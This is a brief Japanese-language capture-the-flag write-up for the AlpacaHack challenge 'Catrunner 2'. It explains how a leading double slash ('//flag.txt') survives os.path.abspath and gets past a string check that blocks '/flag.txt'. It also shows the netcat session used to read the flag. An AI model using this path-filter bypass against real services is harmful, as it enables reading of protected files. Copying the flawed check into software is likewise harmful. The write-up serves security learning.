# Catrunner 2
[Catrunner 2 - AlpacaHack](https://alpacahack.com/daily/challenges/catrunner-2)

## Writeup

```Python:app.py
import os
import subprocess

path = input("Example: /app/hello.txt\n$ cat ")
path = os.path.abspath(path)

if not os.path.isfile(path):
    print("File not found")
    exit(1)

if path == "/flag.txt" or "/proc" in path:
    print("Not permitted")
    exit(1)

subprocess.run(["cat", path])
```

`path = os.path.abspath(path)`で入力されたファイルパスを絶対パスに修正している. これによって単純なディレクトリトラバーサル(`/../flag.txt`など)は無効化される.

`///+flag.txt`の入力は`/flag.txt`に修正されるが, `//flag.txt`はそのまま扱われる.

```python
>>> path = "///flag.txt"
>>> print(os.path.abspath(path))
/flag.txt

>>> path = "//flag.txt"
>>> print(os.path.abspath(path))
//flag.txt
```

これを用いて`/flag.txt`の内容を表示すれば良い.

```bash
nc 12.345.678.901 1234
Example: /app/hello.txt
$ cat //flag.txt
Alpaca{REDACTED}
```
